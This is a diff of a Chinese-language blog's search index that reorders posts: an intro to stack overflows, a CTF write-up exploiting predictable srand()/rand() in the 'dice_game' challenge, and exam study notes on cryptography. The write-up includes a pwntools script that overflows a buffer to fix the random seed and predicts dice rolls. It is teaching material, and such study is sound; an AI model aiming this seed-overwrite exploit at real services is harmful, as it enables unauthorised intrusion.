-<h1 id="0x02-栈溢出"><a href="#0x02-栈溢出" class="headerlink" title="0x02 栈溢出"></a>0x02 栈溢出</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致栈中与其相邻的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞。<br>发生栈溢出的基本前提是：</p>
-<ul>
-<li>程序必须向栈上写入数据</li>
-<li>写入的数据大小没有被良好地控制</li>
-</ul>
-<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://zhuanlan.zhihu.com/p/34665623">从零开始学CTF</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -901,39 +901,6 @@
       </tags>
   </entry>
   <entry>
-    <title>PWN中伪随机数问题--srand()/rand()</title>
-    <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
-    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
-<a id="more"></a>
-<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
-<p>我们使用如下代码生成10个随机数：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>此时查看运行结果，多次运行结果一样。</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/rand运行.png" style="zoom:50%;"></p>
-<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>结果如图：</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/srand为2.png" style="zoom:50%;"></p>
-<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界—dice_game</strong></p>
-<p>我们直接拖入ida看源码</p>
-<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/dice-game.png" style="zoom:80%;"></p>
-<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
-<p>python脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome, let me know your name: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the point(1~6): &#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
-<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266">关于rand()和srand()</a></p>
-<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2020年软考--信息安全工程师学习笔记</title>
     <url>/2020/09/09/2020%E5%B9%B4%E8%BD%AF%E8%80%83-%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>2020年准备报考信息安全工程师，8月底出了《信息安全工程师教程（第2版）》，原来8大章节变成了26章（？？？），考试出题也以新版教程和大纲出题。</p>
@@ -977,6 +944,39 @@
       </categories>
       <tags>
         <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PWN中伪随机数问题--srand()/rand()</title>
+    <url>/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/</url>
+    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>PWN中通常使用srand()和rand()配合使用来设置伪随机数。通常当我们输入的数可以覆盖到srand()中的值时，我们可以预测rand()产生固定序列。</p>
+<a id="more"></a>
+<h1 id="0x01-关于rand-和sand"><a href="#0x01-关于rand-和sand" class="headerlink" title="0x01 关于rand()和sand()"></a>0x01 关于rand()和sand()</h1><h2 id="rand"><a href="#rand" class="headerlink" title="rand()"></a>rand()</h2><p>rand()函数是使用线性同余法生成随机数，因为其周期特别长，所以在一定范围内可以看成随机的。但每次生成都是固定的序列</p>
+<p>我们使用如下代码生成10个随机数：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此时查看运行结果，多次运行结果一样。</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/rand运行.png" style="zoom:50%;"></p>
+<h2 id="srand"><a href="#srand" class="headerlink" title="srand()"></a>srand()</h2><p>srand()为初始化随机数发生器，用于设置rand()产生随机数时的种子。传入的参数seed为unsigned int类型，通常我们会使用时间time(NULL)或time(0)作为seed。当我们不设置srand()时，将默认为srand(1)。如果我们设置某个固定的seed，那么虽然在同一次运行时，会有不同的随机数产生，但是对于这段程序的多次运行所得到的结果是不变的。如下代码：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		srand(<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; rand() &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>结果如图：</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/srand为2.png" style="zoom:50%;"></p>
+<h1 id="0x02-简单示例"><a href="#0x02-简单示例" class="headerlink" title="0x02 简单示例"></a>0x02 简单示例</h1><p><strong>攻防世界—dice_game</strong></p>
+<p>我们直接拖入ida看源码</p>
+<p><img src="/2020/09/07/PWN%E4%B8%AD%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%97%AE%E9%A2%98-srand-rand/dice-game.png" style="zoom:80%;"></p>
+<p>由于我们可以覆盖seed，所以再输入payload时，将seed设置为1.</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p>此时，我们就直接使用给出的libc来自动计算随机数</p>
+<p>python脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p = remote(IP，port)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">64</span> + p64(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome, let me know your name: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    payload = str(libc.rand() % <span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Give me the point(1~6): &#x27;</span>,payload)</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p><strong>ctypes包的cdll.LoadLibrary(‘libc.so.xxx’)可以在在脚本中加载动态库，同时又能调用库中的函数。</strong></p>
+<h1 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h1><p><a href="https://blog.csdn.net/u013745804/article/details/82379266">关于rand()和srand()</a></p>
+<p><a href="https://blog.csdn.net/weixin_39194641/article/details/103089862">CTF中的PWN——srand()/rand()漏洞（栈溢出）</a></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -1213,121 +1213,6 @@
       </categories>
       <tags>
         <tag>next</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>第3章 密码学基本理论</title>
-    <url>/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/</url>
-    <content><![CDATA[<h1 id="密码学概况"><a href="#密码学概况" class="headerlink" title="密码学概况"></a>密码学概况</h1><p>密码学主要由密码编码和密码分析两个部分组成。密码编码学研究信息等变换处理以实现信息等安全保护，密码分析学研究通过密文获取对应的明文信息。</p>
-<a id="more"></a>
-<h2 id="密码安全性分析"><a href="#密码安全性分析" class="headerlink" title="密码安全性分析"></a>密码安全性分析</h2><p>密码分析攻击类型分为五种：</p>
-<ol>
-<li>唯密文攻击（ciphertext-only attack）。密码分析者只拥有一个或多个用一个密钥加密等密文。</li>
-<li>已知明文攻击（known-plaintext attack）。密码分析者仅知道当前密钥下的一些明文及所对应的密文。</li>
-<li>选择明文攻击（chosen-plaintext attack）。密码分析者能够得到当前密钥下自己选定的明文所对应的密文。</li>
-<li>密文验证攻击（ciphertext verification attack）。密码分析者对于任何选定的密文，能够得到该密文“是否合法”的判断。</li>
-<li>选择密文攻击（chosen-ciphertext attack）。除了挑战密文外，密码分析者能够得到选定的密文所对应的明文。</li>
-</ol>
-<h1 id="密码体制分类"><a href="#密码体制分类" class="headerlink" title="密码体制分类"></a>密码体制分类</h1><h2 id="私钥密码体制"><a href="#私钥密码体制" class="headerlink" title="私钥密码体制"></a>私钥密码体制</h2><p>又称为对称密码体制，加解密使用相同密钥。n个使用者，则共有n(n-1)/2个密钥。</p>
-<p>缺点：密钥分配问题、密钥管理问题以及无法认证源。</p>
-<p>典型算法：DES、IDEA、AES</p>
-<h2 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h2><p>又称为非对称密码体制，公钥加密，私钥解密。</p>
-<p>优点：分发方便，密钥保管量少，支持数字签名。</p>
-<p>公钥密码：RSA体制、ELGamal体制以及椭圆曲线密码体制。</p>
-<h2 id="混合密码体制"><a href="#混合密码体制" class="headerlink" title="混合密码体制"></a>混合密码体制</h2><p>利用公钥密码体制分配私钥密码体制密钥，双方共用此密钥，然后按私钥密码体制加解密。工作原理如图：</p>
-<p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/混合密码.jpg" alt></p>
-<h1 id="常见密码算法"><a href="#常见密码算法" class="headerlink" title="常见密码算法"></a>常见密码算法</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>分组长度64位，<strong>秘钥为64比特，实际使用56比特，另外8位用作奇偶校验。</strong>进行16轮加密，得到64比特的密文串。三重DES（TDEA）执行3次DES。</p>
-<p>计算：设输入为b1b2b3b4b5b6，则以b1b6组成的二进制位行号，b2b3b4b5组成的二进制位列号。行列交点处对应的值转换为二进制作为输出。则当S1盒输入为”111000”时，则第1位和第6位组成二进制串”10”（十进制2），中间四位组成二进制“1100”（十进制12）。查询S1盒的2行12列，得到数字3，得到输出二进制数是0011。需要注意行号和列号从0开始。</p>
-<h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><p>国际数据加密算法。明文密文64比特，密钥128比特。在PGP中IDEA接受64比特分组加密。</p>
-<p>进行 8 轮迭代操作，每轮需要 6 个子密钥，另外还需要 4 个额外子密钥输出变换，所以总共需要 52 个子密钥（从 128 比特密钥中扩展）。</p>
-<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>AES明文分组长度至少是128位；秘钥长度也可以是128位，192位，256位。</p>
-<p>新版中未作解读，需要了解详情的可以看这篇文章：<a href="https://zhuanlan.zhihu.com/p/78913397">密码学基础：AES加密算法</a></p>
-<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>非对称算法。应用于SSH、OpenPGP、S/MIME、SSL/TLS等</p>
-<p> 步骤：</p>
-<ol>
-<li>生成两个大素数p和q。</li>
-<li>计算两个素数的乘机n=pq。</li>
-<li>计算小于n并且与n互素的整数的个数，即欧拉函数$φ(n)=(p-1)(q-1)$。</li>
-<li>选取一个随机数e，且满足$1&lt;e&lt;φ(n)$，并且e和$φ(n)$互素，即$gcd(e,φ(n))=1$。</li>
-<li>计算$d=e^{-1}mod(φ(n))$，即ed=1（modφ(n)），即$d=\frac{kφ(n)+1}{e}$，k为p-1和q-1的最大公约数。</li>
-<li>保密d、p和q，而公开n和e，即d作为私钥，而n和e作为公钥。</li>
-</ol>
-<p>明文M，密文C加解密算法如下</p>
-<script type="math/tex; mode=display">
-C=M^emod(n)</script><script type="math/tex; mode=display">
-M=C^dmod(n)</script><h2 id="国产密码算法"><a href="#国产密码算法" class="headerlink" title="国产密码算法"></a>国产密码算法</h2><p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/国产商用密码.jpg" alt></p>
-<h1 id="Hash函数与数字签名"><a href="#Hash函数与数字签名" class="headerlink" title="Hash函数与数字签名"></a>Hash函数与数字签名</h1><h2 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h2><p>杂凑函数简称Hash函数。用h表示Hash函数：</p>
-<ul>
-<li>h的输入可以是任意长度的消息或文件M</li>
-<li>h的输出的长度是固定的</li>
-<li>给定h和M，计算h(M)是容易的</li>
-<li>给定h的描述，找两个不同的消息M1和M2，使h(M1)=h(M2)是计算上不可行的。</li>
-</ul>
-<h2 id="Hash算法"><a href="#Hash算法" class="headerlink" title="Hash算法"></a>Hash算法</h2><p>将任意长的比特串映射到一个固定长的比特串。</p>
-<p>算法：MD5算法、SHA算法、SM3国产算法</p>
-<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>确认数据的完整性、真实性和抗抵赖性。</p>
-<p>满足三个条件：1. 非否认。2. 真实性。3. 可鉴别性。</p>
-<ul>
-<li>数字签名流程：<ol>
-<li>A用Hash函数加密文件形成摘要</li>
-<li>A用自己私钥将消息摘要加密，形成数字签名。</li>
-<li>A将加密摘要和原文一并发给B</li>
-</ol>
-</li>
-<li>验证签名流程：<ol>
-<li>B使用A相同Hash算法计算文件摘要</li>
-<li>B使用A公钥解密数字签名，恢复A的消息摘要</li>
-<li>比较两个消息摘要，一致则未被篡改</li>
-</ol>
-</li>
-</ul>
-<h1 id="密码管理与数字签名"><a href="#密码管理与数字签名" class="headerlink" title="密码管理与数字签名"></a>密码管理与数字签名</h1><h2 id="密码管理"><a href="#密码管理" class="headerlink" title="密码管理"></a>密码管理</h2><ol>
-<li>密钥管理</li>
-</ol>
-<p>生命周期：密钥生成、密钥存储、密钥分发、密钥使用、密钥更新、密钥撤销、密钥备份、密钥恢复、密钥销毁、密钥审计。</p>
-<ol>
-<li><p>密码管理政策</p>
-<p>《商用密码管理条例》：商用密码的科研生产管理、销售管理、使用管理、安全保密管理。</p>
-<p>《中华人民共和国密码法》：密码分为核心密码、普通密码、商用密码。</p>
-</li>
-<li><p>密码测评</p>
-<p>对相关密码产品即系统安全行、合规性评估。</p>
-<p>机构：商用密码检测中心</p>
-</li>
-</ol>
-<h2 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h2><p>公钥证书，由认证机构（CA）签名包含公开密钥拥有者信息、公开密钥、签发者信息、有效期以及扩展信息的一种数据结构。</p>
-<p>类别：个人证书、机构证书和设备证书</p>
-<p>用途：签名证书和加密证书</p>
-<p>CA：提供证书的申请、审核、签发、查询、发布以及证书吊销等全生命周期的管理服务。</p>
-<p>认证系统主要有目录服务器、OCSP服务器、注册服务器、签发服务器等。</p>
-<p>典型的PKI系统由5个基本部分组成：<strong>证书申请者、RA注册中心、CA认证中心、证书库和证书信任方</strong>。</p>
-<h1 id="安全协议"><a href="#安全协议" class="headerlink" title="安全协议"></a>安全协议</h1><h2 id="Diffie-Hellman密钥交换协议"><a href="#Diffie-Hellman密钥交换协议" class="headerlink" title="Diffie-Hellman密钥交换协议"></a>Diffie-Hellman密钥交换协议</h2><script type="math/tex; mode=display">
-C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M求d需指数级次计算。</p>
-<p>操作步骤：</p>
-<ol>
-<li>A与B确定一个素数p和整数a，并使a是p的原根，a，p可公开</li>
-<li>A秘密选取整数$a_A$，计算$y_A=a^{a_A}mod(p)$,并把$y_A$发送给B</li>
-<li>B密码选取整数$a_B$，计算$y_B=a^{a_B}mod(p)$,并把$y_B$发送给A，$y_A$和$y_B$即公开值</li>
-<li>A和B双方分别计算出共享密钥K</li>
-</ol>
-<p>A：$K=(y_B)^{a_A}mod(p)$</p>
-<p>B：<script type="math/tex">K=(y_A)^{a_B}mod(p)</script></p>
-<p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/Diffie-Hellman.jpg" alt></p>
-<h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>组成：SSH传输层协议、SSH用户认证协议和SSH连接协议三个子协议。</p>
-<p>SSH工作机制7个步骤：</p>
-<p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/SSH工作流程.jpg" alt></p>
-<p>认证服务器的公钥真实性：</p>
-<ol>
-<li>随身携带含有服务器公钥的拷贝，进行密钥交换前，读入客户端</li>
-<li>从公开信道下载公钥和指纹，通过电话验证公钥指纹的真实性，用HASH软件生成公钥指纹，进行比较</li>
-<li>通过PKI技术来验证服务器</li>
-</ol>
-]]></content>
-      <categories>
-        <category>信息安全工程师软考</category>
-      </categories>
-      <tags>
-        <tag>学习笔记</tag>
       </tags>
   </entry>
   <entry>
@@ -1705,6 +1590,121 @@ C^d=M mod (P)</script><p>在已知C和P的前提下，由d求M很容易，由M�
 <li>强化存储安全管理（专人负责，审批登记、备份、密封、消除数据）</li>
 <li>数据存储加密保存</li>
 <li>容错容灾存储技术（磁盘阵列、双机在线备份、离线备份）</li>
+</ol>
+]]></content>
+      <categories>
+        <category>信息安全工程师软考</category>
+      </categories>
+      <tags>
+        <tag>学习笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第3章 密码学基本理论</title>
+    <url>/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/</url>
+    <content><![CDATA[<h1 id="密码学概况"><a href="#密码学概况" class="headerlink" title="密码学概况"></a>密码学概况</h1><p>密码学主要由密码编码和密码分析两个部分组成。密码编码学研究信息等变换处理以实现信息等安全保护，密码分析学研究通过密文获取对应的明文信息。</p>
+<a id="more"></a>
+<h2 id="密码安全性分析"><a href="#密码安全性分析" class="headerlink" title="密码安全性分析"></a>密码安全性分析</h2><p>密码分析攻击类型分为五种：</p>
+<ol>
+<li>唯密文攻击（ciphertext-only attack）。密码分析者只拥有一个或多个用一个密钥加密等密文。</li>
+<li>已知明文攻击（known-plaintext attack）。密码分析者仅知道当前密钥下的一些明文及所对应的密文。</li>
+<li>选择明文攻击（chosen-plaintext attack）。密码分析者能够得到当前密钥下自己选定的明文所对应的密文。</li>
+<li>密文验证攻击（ciphertext verification attack）。密码分析者对于任何选定的密文，能够得到该密文“是否合法”的判断。</li>
+<li>选择密文攻击（chosen-ciphertext attack）。除了挑战密文外，密码分析者能够得到选定的密文所对应的明文。</li>
+</ol>
+<h1 id="密码体制分类"><a href="#密码体制分类" class="headerlink" title="密码体制分类"></a>密码体制分类</h1><h2 id="私钥密码体制"><a href="#私钥密码体制" class="headerlink" title="私钥密码体制"></a>私钥密码体制</h2><p>又称为对称密码体制，加解密使用相同密钥。n个使用者，则共有n(n-1)/2个密钥。</p>
+<p>缺点：密钥分配问题、密钥管理问题以及无法认证源。</p>
+<p>典型算法：DES、IDEA、AES</p>
+<h2 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h2><p>又称为非对称密码体制，公钥加密，私钥解密。</p>
+<p>优点：分发方便，密钥保管量少，支持数字签名。</p>
+<p>公钥密码：RSA体制、ELGamal体制以及椭圆曲线密码体制。</p>
+<h2 id="混合密码体制"><a href="#混合密码体制" class="headerlink" title="混合密码体制"></a>混合密码体制</h2><p>利用公钥密码体制分配私钥密码体制密钥，双方共用此密钥，然后按私钥密码体制加解密。工作原理如图：</p>
+<p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/混合密码.jpg" alt></p>
+<h1 id="常见密码算法"><a href="#常见密码算法" class="headerlink" title="常见密码算法"></a>常见密码算法</h1><h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><p>分组长度64位，<strong>秘钥为64比特，实际使用56比特，另外8位用作奇偶校验。</strong>进行16轮加密，得到64比特的密文串。三重DES（TDEA）执行3次DES。</p>
+<p>计算：设输入为b1b2b3b4b5b6，则以b1b6组成的二进制位行号，b2b3b4b5组成的二进制位列号。行列交点处对应的值转换为二进制作为输出。则当S1盒输入为”111000”时，则第1位和第6位组成二进制串”10”（十进制2），中间四位组成二进制“1100”（十进制12）。查询S1盒的2行12列，得到数字3，得到输出二进制数是0011。需要注意行号和列号从0开始。</p>
+<h2 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h2><p>国际数据加密算法。明文密文64比特，密钥128比特。在PGP中IDEA接受64比特分组加密。</p>
+<p>进行 8 轮迭代操作，每轮需要 6 个子密钥，另外还需要 4 个额外子密钥输出变换，所以总共需要 52 个子密钥（从 128 比特密钥中扩展）。</p>
+<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>AES明文分组长度至少是128位；秘钥长度也可以是128位，192位，256位。</p>
+<p>新版中未作解读，需要了解详情的可以看这篇文章：<a href="https://zhuanlan.zhihu.com/p/78913397">密码学基础：AES加密算法</a></p>
+<h2 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h2><p>非对称算法。应用于SSH、OpenPGP、S/MIME、SSL/TLS等</p>
+<p> 步骤：</p>
+<ol>
+<li>生成两个大素数p和q。</li>
+<li>计算两个素数的乘机n=pq。</li>
+<li>计算小于n并且与n互素的整数的个数，即欧拉函数$φ(n)=(p-1)(q-1)$。</li>
+<li>选取一个随机数e，且满足$1&lt;e&lt;φ(n)$，并且e和$φ(n)$互素，即$gcd(e,φ(n))=1$。</li>
+<li>计算$d=e^{-1}mod(φ(n))$，即ed=1（modφ(n)），即$d=\frac{kφ(n)+1}{e}$，k为p-1和q-1的最大公约数。</li>
+<li>保密d、p和q，而公开n和e，即d作为私钥，而n和e作为公钥。</li>
+</ol>
+<p>明文M，密文C加解密算法如下</p>
+<script type="math/tex; mode=display">
+C=M^emod(n)</script><script type="math/tex; mode=display">
+M=C^dmod(n)</script><h2 id="国产密码算法"><a href="#国产密码算法" class="headerlink" title="国产密码算法"></a>国产密码算法</h2><p><img src="/2020/09/14/%E7%AC%AC3%E7%AB%A0-%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E6%9C%AC%E7%90%86%E8%AE%BA/国产商用密码.jpg" alt></p>
+<h1 id="Hash函数与数字签名"><a href="#Hash函数与数字签名" class="headerlink" title="Hash函数与数字签名"></a>Hash函数与数字签名</h1><h2 id="Hash函数"><a href="#Hash函数" class="headerlink" title="Hash函数"></a>Hash函数</h2><p>杂凑函数简称Hash函数。用h表示Hash函数：</p>
+<ul>
+<li>h的输入可以是任意长度的消息或文件M</li>
+<li>h的输出的长度是固定的</li>
